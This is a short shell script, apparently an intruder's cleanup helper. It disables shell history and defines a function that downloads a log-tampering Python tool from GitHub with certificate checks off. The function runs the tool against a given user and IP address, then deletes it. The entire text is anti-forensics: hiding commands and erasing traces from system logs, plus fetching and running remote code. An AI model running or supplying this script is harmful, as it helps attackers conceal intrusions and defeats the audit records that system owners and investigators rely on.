
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG;
export HISTFILE=/dev/null;
export HISTSIZE=0;
export HISTFILESIZE=0;

function lclear {
    wget --no-check-certificate  -c -t 3 'https://raw.githubusercontent.com/re4lity/logtamper/master/logtamper.py'
    if [ -f logtamper.py ];then
    	python logtamper.py -m 2 -u $1 -i $2 ;
	rm logtamper.py
    fi
}



